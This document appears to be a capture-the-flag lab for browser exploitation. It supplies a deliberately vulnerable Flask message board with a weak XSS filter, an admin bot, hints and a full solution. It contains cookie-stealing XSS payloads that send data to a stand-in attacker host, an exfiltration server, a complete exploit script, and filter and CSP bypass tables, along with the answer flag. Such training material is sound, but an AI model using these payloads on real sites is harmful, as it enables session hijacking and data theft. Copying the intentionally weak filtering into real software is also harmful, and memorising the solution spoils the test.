# Challenge 04 - Browser Exploitation

**Category:** Web / Pwn
**Difficulty:** Advanced
**Points:** 500
**Target:** Custom Web Application with XSS Bot

## Challenge Description

A web application has a "report to admin" feature that sends URLs to an admin bot. The bot visits reported URLs using a real browser (Chromium), and the admin has access to a secret flag page.

The application has input filtering, but you've discovered a way to bypass it. Your mission is to craft an XSS payload that steals the admin's session cookie or accesses the flag on their behalf.

## Objectives

- Bypass XSS filters and Content Security Policy
- Craft advanced XSS payloads
- Exploit browser-based vulnerabilities
- Exfiltrate data from the admin's session
- Understand browser security mechanisms

## Target Information

- **URL:** http://localhost:8891
- **Admin Bot:** Chromium headless browser
- **Cookies:** HttpOnly flag NOT set (intentionally vulnerable)
- **CSP:** Partial CSP implementation with bypass

## Getting Started

1. Create the vulnerable application:

```python
#!/usr/bin/env python3
"""Browser Exploitation Challenge - XSS with Admin Bot"""

from flask import Flask, request, render_template_string, make_response, jsonify
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
import threading
import time
import os
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# Admin credentials
ADMIN_FLAG = "FLAG{x55_c00k13_st34l1ng_v14_b0t}"
ADMIN_SESSION = secrets.token_hex(16)

# Store for messages
messages = []

# Basic XSS filter (intentionally bypassable)
def sanitize(text):
    """Weak XSS filter - can be bypassed"""
    # Block obvious script tags
    blocklist = ['<script', '</script', 'javascript:', 'onerror=', 'onload=']
    text_lower = text.lower()
    for blocked in blocklist:
        if blocked in text_lower:
            return text.replace(blocked, '[FILTERED]')
    return text

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>XSS Challenge</title>
        <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
    </head>
    <body>
        <h1>Message Board</h1>

        <h3>Post a Message</h3>
        <form action="/post" method="post">
            <textarea name="message" rows="4" cols="50"></textarea><br>
            <button type="submit">Post</button>
        </form>

        <h3>Report URL to Admin</h3>
        <form action="/report" method="post">
            <input type="text" name="url" size="50" placeholder="URL to report"><br>
            <button type="submit">Report to Admin</button>
        </form>

        <h3>Messages</h3>
        <div id="messages">
            {% for msg in messages %}
            <div class="message">{{ msg | safe }}</div>
            <hr>
            {% endfor %}
        </div>

        <p><a href="/flag">View Flag (Admin Only)</a></p>
    </body>
    </html>
    ''', messages=messages)

@app.route('/post', methods=['POST'])
def post_message():
    message = request.form.get('message', '')
    # Apply weak filter
    sanitized = sanitize(message)
    messages.append(sanitized)
    return '<script>alert("Message posted!");window.location="/";</script>'

@app.route('/flag')
def flag():
    session = request.cookies.get('session')
    if session == ADMIN_SESSION:
        return jsonify({"flag": ADMIN_FLAG})
    else:
        return jsonify({"error": "Admin access required"}), 403

@app.route('/report', methods=['POST'])
def report():
    url = request.form.get('url', '')
    if not url.startswith('http'):
        return "Invalid URL", 400

    # Start admin bot in background thread
    thread = threading.Thread(target=visit_as_admin, args=(url,))
    thread.start()

    return "Admin will visit your URL shortly!"

def visit_as_admin(url):
    """Admin bot visits URL with session cookie"""
    try:
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')

        driver = webdriver.Chrome(options=options)

        # First, visit the app to set the admin cookie
        driver.get('http://localhost:8891/')
        driver.add_cookie({
            'name': 'session',
            'value': ADMIN_SESSION,
            'domain': 'localhost'
        })

        # Now visit the reported URL
        print(f"[Admin Bot] Visiting: {url}")
        driver.get(url)
        time.sleep(3)  # Give time for XSS to execute

        driver.quit()
    except Exception as e:
        print(f"[Admin Bot] Error: {e}")

@app.route('/receive', methods=['GET', 'POST'])
def receive_stolen():
    """Endpoint to receive stolen data"""
    data = request.args.get('data') or request.form.get('data') or request.data
    print(f"[!] Received stolen data: {data}")
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8891, debug=False, threaded=True)
```

2. Install dependencies:
   ```bash
   pip install flask selenium
   # Also need Chrome/Chromium and chromedriver
   ```

3. Run the application:
   ```bash
   python xss_challenge.py
   ```

---

## Hints

<details>
<summary>Hint 1 (Cost: -50 points)</summary>

The XSS filter blocks `<script`, `</script`, `javascript:`, `onerror=`, and `onload=`. But there are many other ways to execute JavaScript!

Try these bypass techniques:
- Different event handlers: `onclick`, `onmouseover`, `onfocus`, `onauxclick`
- SVG tags: `<svg onload=...>`  (but onload is blocked...)
- SVG with different events: `<svg><animate onbegin=...>`
- Image tags: `<img src=x onerror=...>` (but onerror is blocked...)
- Case variations: `OnErRoR` (if filter is case-sensitive)
- Encoding: HTML entities, URL encoding

</details>

<details>
<summary>Hint 2 (Cost: -75 points)</summary>

The filter is case-sensitive! It only blocks lowercase versions.

Try: `<img src=x ONERROR=alert(1)>`

Or use less common event handlers that aren't filtered:
- `<body onpageshow=alert(1)>`
- `<marquee onstart=alert(1)>`
- `<details open ontoggle=alert(1)>`
- `<svg><set onbegin=alert(1)>`

The CSP allows `'unsafe-inline'` for scripts, so inline JavaScript will execute.

</details>

<details>
<summary>Hint 3 (Cost: -100 points)</summary>

**Full Attack Chain:**

1. **Create payload that steals cookies:**
```html
<img src=x ONERROR="fetch('http://YOUR_SERVER:8000/?c='+document.cookie)">
```

2. **Host payload on the vulnerable app:**
   Post a message with the XSS payload

3. **Report the page URL to admin:**
   Report `http://localhost:8891/` (the page with your XSS)

4. **Admin bot visits, XSS executes, cookie is stolen:**
   You receive the admin's session cookie

5. **Use stolen cookie to get flag:**
```bash
curl -b "session=STOLEN_COOKIE" http://localhost:8891/flag
```

Alternative: Make XSS fetch the flag directly:
```html
<img src=x ONERROR="fetch('/flag').then(r=>r.text()).then(d=>fetch('http://YOUR_SERVER:8000/?f='+btoa(d)))">
```

</details>

---

## Solution Walkthrough

<details>
<summary>Click to reveal full solution</summary>

### Step 1: Test the XSS Filter

```bash
# Test basic script tag
curl -X POST http://localhost:8891/post -d "message=<script>alert(1)</script>"
# Result: [FILTERED]alert(1)[FILTERED]

# Test onerror
curl -X POST http://localhost:8891/post -d "message=<img src=x onerror=alert(1)>"
# Result: <img src=x [FILTERED]alert(1)>

# Test case bypass
curl -X POST http://localhost:8891/post -d "message=<img src=x ONERROR=alert(1)>"
# Result: <img src=x ONERROR=alert(1)>  (not filtered!)
```

### Step 2: Set Up Exfiltration Server

```bash
# Simple Python server to receive stolen data
python3 -m http.server 8000
```

Or use a more sophisticated receiver:
```python
#!/usr/bin/env python3
from flask import Flask, request
app = Flask(__name__)

@app.route('/')
def receive():
    cookie = request.args.get('c', '')
    flag = request.args.get('f', '')
    print(f"[+] Cookie: {cookie}")
    print(f"[+] Flag: {flag}")
    return "OK"

app.run(host='0.0.0.0', port=8000)
```

### Step 3: Craft XSS Payload

**Method 1: Steal Cookie**
```html
<img src=x ONERROR="fetch('http://ATTACKER_IP:8000/?c='+document.cookie)">
```

**Method 2: Directly Fetch Flag**
```html
<img src=x ONERROR="fetch('/flag').then(r=>r.json()).then(d=>fetch('http://ATTACKER_IP:8000/?f='+d.flag))">
```

**Method 3: More Stealthy (using Image)**
```html
<img src=x ONERROR="new Image().src='http://ATTACKER_IP:8000/?c='+document.cookie">
```

### Step 4: Post the Payload

```bash
# Post XSS payload as a message
curl -X POST http://localhost:8891/post \
     -d "message=<img src=x ONERROR=\"fetch('http://YOUR_IP:8000/?c='+document.cookie)\">"
```

Or through the web interface.

### Step 5: Report URL to Admin

```bash
# Report the main page (where XSS is stored)
curl -X POST http://localhost:8891/report \
     -d "url=http://localhost:8891/"
```

### Step 6: Receive Stolen Cookie

On your exfiltration server:
```
[+] Cookie: session=a1b2c3d4e5f6...
```

### Step 7: Get the Flag

```bash
curl -b "session=a1b2c3d4e5f6..." http://localhost:8891/flag
# {"flag": "FLAG{x55_c00k13_st34l1ng_v14_b0t}"}
```

### Complete Python Exploit

```python
#!/usr/bin/env python3
"""Browser Exploitation - Full Exploit"""

import requests
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import urllib.parse
import base64

TARGET = "http://localhost:8891"
ATTACKER_SERVER = "http://YOUR_IP:8000"

stolen_data = {}

class ExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global stolen_data
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)

        if 'c' in params:
            stolen_data['cookie'] = params['c'][0]
            print(f"[+] Stolen cookie: {stolen_data['cookie']}")
        if 'f' in params:
            try:
                stolen_data['flag'] = base64.b64decode(params['f'][0]).decode()
            except:
                stolen_data['flag'] = params['f'][0]
            print(f"[+] Stolen flag: {stolen_data['flag']}")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        pass  # Suppress logging

def start_exfil_server():
    server = HTTPServer(('0.0.0.0', 8000), ExfilHandler)
    server.serve_forever()

def main():
    # Start exfiltration server in background
    print("[*] Starting exfiltration server on port 8000...")
    exfil_thread = threading.Thread(target=start_exfil_server, daemon=True)
    exfil_thread.start()
    time.sleep(1)

    # XSS payload - directly exfiltrate flag
    payload = f'<img src=x ONERROR="fetch(\'/flag\').then(r=>r.json()).then(d=>fetch(\'{ATTACKER_SERVER}/?f=\'+btoa(JSON.stringify(d))))">'

    # Post XSS payload
    print("[*] Posting XSS payload...")
    r = requests.post(f"{TARGET}/post", data={"message": payload})

    # Report URL to admin
    print("[*] Reporting URL to admin bot...")
    r = requests.post(f"{TARGET}/report", data={"url": TARGET + "/"})
    print(f"[*] Response: {r.text}")

    # Wait for admin to visit and XSS to execute
    print("[*] Waiting for admin bot (10 seconds)...")
    for i in range(10):
        time.sleep(1)
        if 'flag' in stolen_data or 'cookie' in stolen_data:
            break
        print(f"    {i+1}...")

    # Check results
    if 'flag' in stolen_data:
        print(f"\n[+] SUCCESS! Flag: {stolen_data['flag']}")
    elif 'cookie' in stolen_data:
        print(f"\n[+] Got cookie: {stolen_data['cookie']}")
        # Use cookie to get flag
        r = requests.get(f"{TARGET}/flag", cookies={"session": stolen_data['cookie']})
        print(f"[+] Flag: {r.json()}")
    else:
        print("\n[-] No data received. Check your IP/server.")

if __name__ == '__main__':
    main()
```

### Advanced XSS Bypass Techniques

| Filter | Bypass |
|--------|--------|
| `<script>` | `<img onerror>`, `<svg onload>`, `<body onload>` |
| `onerror` | `ONERROR`, `OnErRoR`, `onerror\t=` |
| `javascript:` | `java\nscript:`, URL encoding |
| Parentheses blocked | Template strings, alternative syntax |
| Quotes blocked | `/regex/.source`, `String.fromCharCode()` |
| Dots blocked | `document['cookie']`, `window['location']` |
| `fetch` blocked | `XMLHttpRequest`, `new Image().src` |

### CSP Bypasses

| CSP | Bypass |
|-----|--------|
| `script-src 'self'` | Find script upload, JSONP endpoint |
| `script-src 'unsafe-inline'` | Inline scripts work (this challenge) |
| `default-src 'none'` | DNS exfiltration, link prefetch |
| `script-src cdn.example.com` | Find XSS gadget on CDN |

### Prevention

```python
# SECURE: Proper HTML encoding
from markupsafe import escape

@app.route('/post', methods=['POST'])
def post_secure():
    message = request.form.get('message', '')
    sanitized = escape(message)  # HTML entity encoding
    messages.append(sanitized)

# SECURE: HttpOnly cookies
response.set_cookie('session', value, httponly=True, secure=True, samesite='Strict')

# SECURE: Strong CSP
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'

# SECURE: Input validation whitelist
import bleach
cleaned = bleach.clean(user_input, tags=['p', 'b', 'i'], attributes={})
```

</details>

---

## Flag

```
FLAG{x55_c00k13_st34l1ng_v14_b0t}
```

**Flag Format:** `FLAG{...}`

## Skills Practiced

- XSS filter bypass techniques
- Browser-based exploitation
- Admin bot interaction
- Cookie theft and session hijacking
- CSP understanding and bypass

## Tools Used

- Python (Flask, Selenium)
- curl
- Browser DevTools
- Exfiltration servers

## Related Challenges

- [Web Cache Poisoning (Intermediate)](../intermediate/07-web-cache-poisoning.md) - Web exploitation
- [Multi-Stage Attack (Advanced)](06-multi-stage-attack.md) - Chained exploits

## References

- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [XSS Hunter](https://xsshunter.com/)
